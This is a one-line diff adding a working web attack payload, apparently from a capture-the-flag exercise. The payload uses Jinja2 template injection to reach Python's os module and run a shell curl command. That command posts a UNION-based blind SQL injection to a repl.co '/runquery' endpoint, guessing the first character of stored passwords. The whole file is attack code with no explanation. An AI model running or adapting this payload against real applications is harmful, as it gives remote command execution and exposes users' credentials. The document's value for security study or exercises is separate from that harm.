@@ -1,0 +1,1 @@
+{{ request['application']['__globals__']['__builtins__']['__import__']('os')['popen']("curl -d \"{\\\"username\\\":\\\"1\\\",\\\"password\\\":\\\"1' UNION SELECT * FROM users WHERE SUBSTR(password,1,1)='L' -- \\\"}\" -H 'Content-Type: application/json' https://flushed-emoji-sql\x2Estephaniew4\x2Erepl\x2Eco/runquery")["read"]() }}
